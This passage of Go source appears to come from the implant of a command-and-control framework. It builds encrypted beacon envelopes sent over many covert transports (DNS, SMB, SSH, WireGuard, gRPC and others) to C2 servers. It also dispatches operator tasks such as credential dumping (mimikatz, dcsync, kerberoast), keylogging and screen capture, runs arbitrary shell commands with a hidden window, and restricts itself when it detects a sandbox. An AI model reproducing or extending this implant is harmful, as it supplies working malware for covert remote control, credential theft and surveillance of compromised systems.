	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}

	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	return rbuf
}

// verifyResponseMAC checks the server's authentication response MAC:
// HMAC(regKey, agentUUID || seq || server_pub). Guards against MITM public-key
// substitution. A missing/invalid registration key fails closed.
func verifyResponseMAC(seq uint64, serverPubB64, macB64 string) bool {
	if agentRegKey == nil || macB64 == "" || serverPubB64 == "" {
		return false
	}
	expected := computeFrameMAC(agentRegKey, agentUUID, strconv.FormatUint(seq, 10), serverPubB64)
	got, err := base64.StdEncoding.DecodeString(macB64)
	if err != nil {
		return false
	}
	return hmac.Equal(expected, got)
}

// v2Envelope is the top-level transport envelope (mirrors the server's
// beaconEnvelope field layout). SecretID is the v3 per-implant secret id,
// carried only on registration frames.
type v2Envelope struct {
	UUID        string `json:"uuid"`
	Seq         uint64 `json:"seq,omitempty"`
	Ts          int64  `json:"ts,omitempty"`
	ECDHPub     string `json:"ecdh_pub,omitempty"`
	CipherB64   string `json:"c,omitempty"`
	Mac         string `json:"mac,omitempty"`
	IdentityPub string `json:"id_pub,omitempty"`
	RegHMAC     string `json:"reg_hmac,omitempty"`
	SecretID    string `json:"secret_id,omitempty"`
}

// buildBeaconEnvelope wraps a plaintext beacon request in the v2 transport
// envelope: registration (first run), authenticated handshake (session
// missing/rekey), or AES-256-GCM ciphertext bound to (uuid, seq). Encryption
// is mandatory — there is no plaintext or legacy XOR fallback.
// Returns the bytes to transmit, the frame kind, the frame sequence and
// ok=false when the payload MUST NOT be sent.
func buildBeaconEnvelope(body []byte) (sendBody []byte, kind agentFrameKind, seq uint64, ok bool) {
	if ecdhSess == nil || identityPriv == nil {
		return nil, 0, 0, false
	}
	seq = nextBeaconSeq()
	ts := time.Now().Unix()
	env := v2Envelope{UUID: agentUUID, Seq: seq, Ts: ts}

	seqMu.Lock()
	reg := registered
	rekey := rekeyRequested
	seqMu.Unlock()

	switch {
	case !reg:
		// One-time registration binds the identity key.
		kind = agentFrameRegister
		idPub := identityPubB64()
		if idPub == "" || agentRegKey == nil {
			return nil, 0, 0, false
		}
		env.ECDHPub = idPub
		env.IdentityPub = idPub
		env.SecretID = RegSecretIDStr
		env.RegHMAC = base64.StdEncoding.EncodeToString(computeRegHMAC(agentRegKey, agentUUID, idPub, ts))
	case ecdhSess.needsHandshake() || rekey:
		// Authenticated handshake with a fresh ephemeral key.
		kind = agentFrameHandshake
		env.ECDHPub = ecdhSess.publicKeyB64()
		if agentRegKey == nil {
			return nil, 0, 0, false
		}
		env.Mac = base64.StdEncoding.EncodeToString(computeFrameMAC(agentRegKey, agentUUID, env.ECDHPub, strconv.FormatInt(ts, 10)))
	default:
		kind = agentFrameEncrypted
		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(seq, 10))
		cipherB64, err := ecdhSess.encryptAESGCMWithAAD(body, aad)
		if err != nil {
			return nil, 0, 0, false
		}
		env.CipherB64 = cipherB64
	}

	// Persist the sequence before sending so it can never go backwards.
	persistBeaconState()

	envelopeJSON, err := json.Marshal(env)
	if err != nil {
		return nil, 0, 0, false
	}
	return envelopeJSON, kind, seq, true
}

// ensureResultID assigns a per-result unique id when the producer did not
// supply one (results generated outside the task worker, e.g. screenshots).
// ids are RFC 9562 UUIDv7 so they are time-ordered and sortable while staying
// unpredictable.
func ensureResultID(res *TaskResult) {
	if res.ResultID != "" {
		return
	}
	res.ResultID = protocol.UUIDv7()
}

func sendTaskResult(res TaskResult) {
	// Results keep a unique id for server-side idempotency: a result that is
	// re-queued after a dropped frame is resent with a new envelope seq, so
	// the server must dedupe on (task_id, rid) rather than the frame seq.
	ensureResultID(&res)
	// Quick results only make sense over an established session. Without one,
	// re-queue so the next regular beacon carries the result — a registration
	// or handshake frame cannot piggyback results.
	seqMu.Lock()
	ready := registered && !rekeyRequested
	seqMu.Unlock()
	if ecdhSess == nil || ecdhSess.needsHandshake() || !ready {
		pendingMu.Lock()
		pendingResults = append(pendingResults, res)
		pendingMu.Unlock()
		inFastMode.Store(true)
		return
	}

	req := BeaconRequest{
		UUID:            agentUUID,
		ProtocolVersion: CurrentProtocolVersion,
		Results:         []TaskResult{res},
	}
	body, _ := json.Marshal(req)
	// Encrypt with the session key so quick results never leak plaintext over
	// any transport (including DNS). If encryption fails, re-queue the result
	// rather than transmitting it in clear.
	sendBody, kind, _, ok := buildBeaconEnvelope(body)
	if !ok || kind != agentFrameEncrypted {
		pendingMu.Lock()
		pendingResults = append(pendingResults, res)
		pendingMu.Unlock()
		inFastMode.Store(true)
		return
	}
	if Protocol == "tcp" {
		sendTCPBeacon(sendBody) // fire and forget
	} else if Protocol == "dns" {
		sendDNSBeacon(sendBody) // fire and forget
	} else if Protocol == "smb" || BeaconTransport == "smb" {
		sendSMBBeacon(sendBody)
	} else if BeaconTransport == "wss" {
		sendWSSBeacon(sendBody)
	} else if BeaconTransport == "ssh" || strings.HasPrefix(C2URLs[currentC2Idx], "ssh://") {
		sendSSHBeacon(sendBody)
	} else if BeaconTransport == "mtls" || strings.HasPrefix(C2URLs[currentC2Idx], "mtls://") {
		sendMTLSBeacon(sendBody)
	} else if BeaconTransport == "h2c" || strings.HasPrefix(C2URLs[currentC2Idx], "h2c://") {
		sendH2CBeacon(sendBody)
	} else if BeaconTransport == "wg" || strings.HasPrefix(C2URLs[currentC2Idx], "wg://") {
		sendWGBeacon(sendBody)
	} else if BeaconTransport == "grpc" || strings.HasPrefix(C2URLs[currentC2Idx], "grpc://") || strings.HasPrefix(C2URLs[currentC2Idx], "grpcs://") {
		sendGRPCBeacon(sendBody)
	} else {
		sendBeacon(sendBody)
	}
}
func executeTask(task Task) TaskResult {
	res := TaskResult{
		TaskID: task.ID,
		Type:   task.Type,
	}

	// Decrypt payload if task is encrypted. The AAD binds each field to the
	// agent and task ID so ciphertext can't be replayed against other tasks.
	if task.Encrypted && ecdhSess != nil {
		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(uint64(task.ID), 10))
		if task.Command != "" {
			dec, err := ecdhSess.decryptAESGCMWithAAD(task.Command, aad)
			if err == nil {
				task.Command = string(dec)
			} else {
				res.Error = "task payload decryption failed"
				return res
			}
		}
		if task.Data != "" {
			dec, err := ecdhSess.decryptAESGCMWithAAD(task.Data, aad)
			if err == nil {
				task.Data = string(dec)
			} else {
				res.Error = "task payload decryption failed"
				return res
			}
		}
	}

	// In sandbox mode, only allow benign commands
	if inSandbox {
		safeCmds := map[string]bool{
			"ps": true, "ls": true, "shell": false, "beacon_now": true,
			"set_sleep": true, "exit": true, "terminate": true, "read": true,
		}
		if !safeCmds[task.Type] {
			res.Error = "sandbox mode: blocked by sandbox detection"
			return res
		}
	}

	// Check environment restrictions from ops profile
	if currentOpsProfile != nil {
		switch {
		case !currentOpsProfile.AllowShell && isShellTask(task.Type):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowInjection && isInjectTask(task.Type):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowCredDump && (task.Type == "mimikatz" || task.Type == "creds" || task.Type == "kerberoast" || task.Type == "lsa_bypass" || task.Type == "dcsync" || strings.HasPrefix(task.Type, "dpapi_")):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowKeylogger && (task.Type == "keylogger_start" || task.Type == "keylogger_dump"):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowScreenCapture && (task.Type == "screenshot" || task.Type == "screenshot_window" || task.Type == "screen_stream_start"):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		}
	}

	if handler, ok := taskHandlers[task.Type]; ok {
		handler(task, &res)
	} else {
		res.Error = "unknown task type: " + task.Type
	}
	return res
}

func runShell(cmdStr, shell string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		if shell == "powershell.exe" || strings.Contains(strings.ToLower(shell), "powershell") {
			if !strings.Contains(cmdStr, "OutputEncoding") {
				cmdStr = "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $OutputEncoding = [System.Text.Encoding]::UTF8; " + cmdStr
			}
			cmd = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmdStr)
		} else {
			cmd = exec.Command("cmd.exe", "/C", "chcp 65001 >nul & "+cmdStr)
		}
		applyHideWindow(cmd)
	} else {
		// Linux / unix
		if shell == "" || shell == "bash" {
			cmd = exec.Command("bash", "-c", cmdStr)
		} else {
			cmd = exec.Command("sh", "-c", cmdStr)
		}
	}

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	return decodeShellOutput(out.Bytes(), shell), err
}

// setDPIAware, captureScreenRGBA and keyloggerLoop are provided exclusively by
// platform-specific files (agent_windows.go / agent_linux.go) via build tags.
